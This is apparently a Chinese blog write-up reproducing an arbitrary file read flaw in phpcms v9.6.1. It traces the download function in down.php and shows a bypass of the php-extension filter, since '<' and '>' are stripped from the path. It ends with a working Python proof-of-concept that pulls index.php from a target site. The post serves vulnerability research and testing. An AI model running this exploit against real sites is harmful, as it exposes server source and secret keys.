date: 2020-02-13
categories:
- cve复现
tags:
- cve复现
title: phpcmsv9.6.1任意文件读取
---
# phpcmsv9.6.1任意文件读取

## 漏洞复现



漏洞位置: `phpcms/modules/content/down.php` 。在该文件的 `download` 方法中最后一行调用了 `file_down` 文件下载函数，我们可以看到其第一个参数是要读取的文件路径。 

```php
	public function download() {
		$a_k = trim($_GET['a_k']);
		$pc_auth_key = md5(pc_base::load_config('system','auth_key').$_SERVER['HTTP_USER_AGENT'].'down');
		$a_k = sys_auth($a_k, 'DECODE', $pc_auth_key);
		if(empty($a_k)) showmessage(L('illegal_parameters'));
		unset($i,$m,$f,$t,$ip);
		parse_str($a_k);		
		...
		$starttime = intval($t);
		if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i',$f) || strpos($f, ":\\")!==FALSE || strpos($f,'..')!==FALSE) showmessage(L('url_error'));
		$fileurl = trim($f);
		if(!$downid || empty($fileurl) || !preg_match("/[0-9]{10}/", $starttime) || !preg_match("/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/", $ip) || $ip != ip()) showmessage(L('illegal_parameters'));	
		$endtime = SYS_TIME - $starttime;
		if($endtime > 3600) showmessage(L('url_invalid'));
		if($m) $fileurl = trim($s).trim($fileurl);
		if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i',$fileurl) ) showmessage(L('url_error'));
		//远程文件
		if(strpos($fileurl, ':/') && (strpos($fileurl, pc_base::load_config('system','upload_url')) === false)) { 
			header("Location: $fileurl");
		} else {
			if($d == 0) {
				header("Location: ".$fileurl);
			} else {
				$fileurl = str_replace(array(pc_base::load_config('system','upload_url'),'/'), array(pc_base::load_config('system','upload_path'),DIRECTORY_SEPARATOR), $fileurl);
				$filename = basename($fileurl);
				//处理中文文件
				if(preg_match("/^([\s\S]*?)([\x81-\xfe][\x40-\xfe])([\s\S]*?)/", $fileurl)) {
					$filename = str_replace(array("%5C", "%2F", "%3A"), array("\\", "/", ":"), urlencode($fileurl));
					$filename = urldecode(basename($filename));
				}
				$ext = fileext($filename);
				$filename = date('Ymd_his').random(3).'.'.$ext;
                $fileurl=str_replace(array("<",">"),"",$fileurl);
				file_down($fileurl, $filename);
			}
		}
	}
```



我们跟进`file_down`:

```php
function file_down($filepath, $filename = '') {
	if(!$filename) $filename = basename($filepath);
	if(is_ie()) $filename = rawurlencode($filename);
	$filetype = fileext($filename);
	$filesize = sprintf("%u", filesize($filepath));
	if(ob_get_length() !== false) @ob_end_clean();
	header('Pragma: public');
	header('Last-Modified: '.gmdate('D, d M Y H:i:s') . ' GMT');
	header('Cache-Control: no-store, no-cache, must-revalidate');
	header('Cache-Control: pre-check=0, post-check=0, max-age=0');
	header('Content-Transfer-Encoding: binary');
	header('Content-Encoding: none');
	header('Content-type: '.$filetype);
	header('Content-Disposition: attachment; filename="'.$filename.'"');
	header('Content-length: '.$filesize);
	readfile($filepath);
	exit;
}
```

可以看到他会直接读取文件然后,exit

我们再看下`download`中的`$fileurl`的生成过程:

```php
if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i',$f) || strpos($f, ":\\")!==FALSE || strpos($f,'..')!==FALSE) showmessage(L('url_error'));
if($m) $fileurl = trim($s).trim($fileurl);
if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i',$fileurl) ) showmessage(L('url_error'));
$fileurl = str_replace(array(pc_base::load_config('system','upload_url'),'/'), array(pc_base::load_config('system','upload_path'),DIRECTORY_SEPARATOR), $fileurl);
$fileurl=str_replace(array("<",">"),"",$fileurl);
```

`$fileurl`由`$f`产生的,其中不能带有php等关键字,但是我们可以利用最后一行的str_replace来绕过,而`$f`由`parse_str($a_k)`得来的

那么接下来我们要找一处

```php
$pc_auth_key = md5(pc_base::load_config('system','auth_key').$_SERVER['HTTP_USER_AGENT'].'down');
$a_k = sys_auth($a_k, 'DECODE', $pc_auth_key);
```

以`$pc_auth_key`作为密钥的加密点

![image3860](https://i.loli.net/2020/02/13/csXBxCmkdWqj3or.png)

显然只有中间的那个可以

```php
$pc_auth_key = md5(pc_base::load_config('system','auth_key').$_SERVER['HTTP_USER_AGENT'].'down');
$a_k = urlencode(sys_auth("i=$i&d=$d&s=$s&t=".SYS_TIME."&ip=".ip()."&m=".$m."&f=$f&modelid=".$modelid, 'ENCODE', $pc_auth_key));
$downurl = '?m=content&c=down&a=download&a_k='.$a_k;
```

而`$i,$m,$f`等都是从`parse_str($a_k);`获得

```php
		parse_str($a_k);
		if(isset($i)) $i = $id = intval($i);
		if(!isset($m)) showmessage(L('illegal_parameters'));
		if(!isset($modelid)||!isset($catid)) showmessage(L('illegal_parameters'));
		if(empty($f)) showmessage(L('url_invalid'));
```

接下来就跟9.6.0版本的sql注入相同了





## 检测脚本

```python
import re
import requests
import random
from urllib.parse import quote
def poc(url,proxies={}):
    sess=requests.session()
    sess.get("%s/index.php?m=wap&siteid=1"%url)
    sess.proxies=proxies
    pre=list(sess.cookies.get_dict())[0][:5]+"_"
    userid=sess.cookies.get_dict()[pre+"siteid"]
    param={
        "m":"attachment",
        "c":"attachments",
        "a":"swfupload_json",
        "src":"=1&m=aa&i=1&modelid=1&catid=1&f=%s&ss=" % quote("index.p<h<p&d=1")
    }
    sess.post("%s/index.php"%url,params=param,data={"userid_flash":userid})
    #print(sess.cookies.get_dict())
    a_k=sess.cookies.get_dict()[pre+"att_json"]
    result=sess.get("%s/index.php?m=content&c=down&a=init&a_k=%s"%(url,a_k)).text
    #print(userid,a_k)
    a_k=re.search('''a_k=([^"]*)''',result).groups()[0]
    #print(result)
    #print(a_k)
    res=sess.get("%s/index.php?m=content&c=down&a=download&a_k=%s"%(url,a_k))
    if res.status_code==200 and "pc_base::creat_app();" in res.text:
        return True
    else :
        return False
    
    

#,{"http":"socks5://127.0.0.1:1080"}
print(poc("http://127.0.0.1/cms/phpcms/9.6.1/"))
```







## 参考

 [https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集/](https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集/) 